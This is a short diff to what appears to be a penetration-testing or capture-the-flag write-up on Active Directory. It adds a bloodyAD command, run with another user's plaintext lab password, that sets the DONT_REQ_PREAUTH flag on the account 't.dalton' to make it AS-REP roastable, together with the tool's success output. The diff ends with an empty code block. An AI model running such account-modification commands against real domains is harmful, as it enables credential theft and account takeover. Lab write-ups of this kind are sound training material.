@@ -409,3 +409,13 @@ https://x3m1sec.gitbook.io/notes/pentest-notes/active-directory-pentesting/tools
 
 I can make it so that this account becomes AS-REP roastable!
 
+```python
+bloodyAD --host dc.northstone.local -d northstone.local -u c.mcgill -p 'chuck102213' add uac 't.dalton' -f DONT_REQ_PREAUTH
+[+] ['DONT_REQ_PREAUTH'] property flags added to t.dalton's userAccountControl
+```
+
+Now the user should be AS-REP roastable!
+
+```python
+
+```
